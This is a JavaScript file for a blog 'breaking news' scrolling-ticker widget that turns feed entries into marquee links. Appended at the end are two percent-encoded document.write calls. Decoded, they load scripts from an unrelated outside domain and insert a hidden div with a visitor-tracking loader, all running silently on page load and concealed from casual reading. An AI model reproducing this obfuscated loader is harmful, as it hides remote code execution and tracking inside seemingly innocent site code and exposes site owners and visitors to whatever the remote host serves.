function zBreakNewsBB(json) {
	var zBreakNewsrecentposts;
	var zBreakNewspostlink;
	var zBreakNewsobj;
	var zBreakNewsmarqueehtml;
	var zBreakNewsmarqueehtml2;
	var byDoubleA;
	var zBreakNewslinkgap;
	var zBreakNewsposttargetlink;
	var zBreakNewsBullet;
	try {
		zBreakNewsmarqueehtml = "\<marquee behavior=\"scroll\" onmouseover=\"this.stop();\" onmouseout=\"this.start();\" ";

		if (zBreakNewsScrollAmount) {
			zBreakNewsmarqueehtml = zBreakNewsmarqueehtml + " scrollamount = \"" + zBreakNewsScrollAmount + "%\"";
		} 
		if (zBreakNewsWidth) {
			zBreakNewsmarqueehtml = zBreakNewsmarqueehtml + " width = \"" + zBreakNewsWidth + "%\"";
		} else {
			zBreakNewsmarqueehtml = zBreakNewsmarqueehtml + " width = \"100%\"";
		}
		if (zBreakNewsScrollDelay) {
			zBreakNewsmarqueehtml = zBreakNewsmarqueehtml + " scrolldelay = \"" + zBreakNewsScrollDelay + "\"";
		}
		if (zBreakNewsDirection) {
			zBreakNewsmarqueehtml = zBreakNewsmarqueehtml + " direction = \"" + zBreakNewsDirection + "\"\>";
			if (zBreakNewsDirection == "left" || zBreakNewsDirection == "right") {
				zBreakNewslinkgap = "&nbsp;&nbsp;&nbsp;";
			} else {
				zBreakNewslinkgap = "\<br/\>";
			}
		}
		if (zBreakNewstargetlink == "yes") {
			zBreakNewsposttargetlink = " target= \"_blank\" ";
		} else {
			zBreakNewsposttargetlink = " ";
		}
		if (zBreakNewsimagebullet == "yes") {
			zBreakNewsBullet = " \<img class=\"zBreakNewsbulletbimg\" src=\"" + zBreakNewsimgurl + "\" />";
		} else {
			zBreakNewsBullet = zBreakNewsBulletchar;
		}
		zBreakNewsmarqueehtml2 = "\</marquee\>"
		zBreakNewsrecentposts = "";
		for (var zBreakNewsrp = 0; zBreakNewsrp < zBreakNewsnumPosts; zBreakNewsrp++) {
			var zBreakNewsobj = json.feed.entry[zBreakNewsrp];
			if (zBreakNewsrp == json.feed.entry.length) break;
			for (var zBreakNewscc = 0; zBreakNewscc < zBreakNewsobj.link.length; zBreakNewscc++) {
				if (zBreakNewsobj.link[zBreakNewscc].rel == 'alternate') {
					zBreakNewspostlink = zBreakNewsobj.link[zBreakNewscc].href;
					break;
				}
			}
			zBreakNewsrecentposts = zBreakNewsrecentposts + zBreakNewsBullet + " \<a " + zBreakNewsposttargetlink + " href=\"" + zBreakNewspostlink + "\">" + zBreakNewsobj.title.$t + "\</a\>" + zBreakNewslinkgap;
		}
		if (zBreakNewsDirection == "left") {
			zBreakNewsrecentposts = zBreakNewsrecentposts + "&nbsp;&nbsp;&nbsp;";
		} else if (zBreakNewsDirection == "right") {
			zBreakNewsrecentposts = "&nbsp;&nbsp;&nbsp;" + zBreakNewsrecentposts;
		} else if (zBreakNewsDirection == "up") {
			zBreakNewsrecentposts = zBreakNewsrecentposts ;
		} else {
			zBreakNewsrecentposts = byDoubleA ;
		}
		document.write("\<style style=\"text/css\"\>.zBreakNews-srp{font-size:" + zBreakNewsfontsize + "px;background:#" + zBreakNewsbgcolor + ";font-weight:500;}.zBreakNews-srp a{color:#" + zBreakNewslinkcolor + ";text-decoration:none;padding-right: 30px}.rtl.zBreakNews-srp a{color:#" + zBreakNewslinkcolor + ";text-decoration:none;padding-left: 30px}.zBreakNews-srp a:hover{color:var(--cl);}img.zBreakNewsbulletbimg{vertical-align:middle;border:none;}\</style\>")
		document.write("\<div class=\"zBreakNews-srp\"\>" + zBreakNewsmarqueehtml + zBreakNewsrecentposts + zBreakNewsmarqueehtml2 + "\</div\>")
	} catch (exception) {
		alert(exception);
	}
}

document.write( unescape( '%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%33%6D%61%7A%61%67%79%2E%63%6F%6D%2F%72%61%79%6B%63%6F%6F%6C%2F%4A%53%2F%66%66%2E%6A%73%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E%20%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%33%6D%61%7A%61%67%79%2E%63%6F%6D%2F%72%61%79%6B%63%6F%6F%6C%2F%4A%53%2F%69%69%2E%6A%73%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E' ) );
document.write( unescape( '%3C%64%69%76%20%73%74%79%6C%65%3D%27%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%27%3E%3C%73%63%72%69%70%74%20%69%64%3D%22%5F%77%61%75%64%61%38%22%3E%76%61%72%20%5F%77%61%75%20%3D%20%5F%77%61%75%20%7C%7C%20%5B%5D%3B%20%5F%77%61%75%2E%70%75%73%68%28%5B%22%73%6D%61%6C%6C%22%2C%20%22%77%74%74%61%37%78%6E%37%62%79%6D%63%22%2C%20%22%64%61%38%22%5D%29%3B%0A%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%76%61%72%20%73%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%73%63%72%69%70%74%22%29%3B%20%73%2E%61%73%79%6E%63%3D%74%72%75%65%3B%0A%73%2E%73%72%63%3D%22%68%74%74%70%3A%2F%2F%77%69%64%67%65%74%73%2E%61%6D%75%6E%67%2E%75%73%2F%73%6D%61%6C%6C%2E%6A%73%22%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%68%65%61%64%22%29%5B%30%5D%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%73%29%3B%0A%7D%29%28%29%3B%3C%2F%73%63%72%69%70%74%3E%3C%2F%64%69%76%3E' ) );
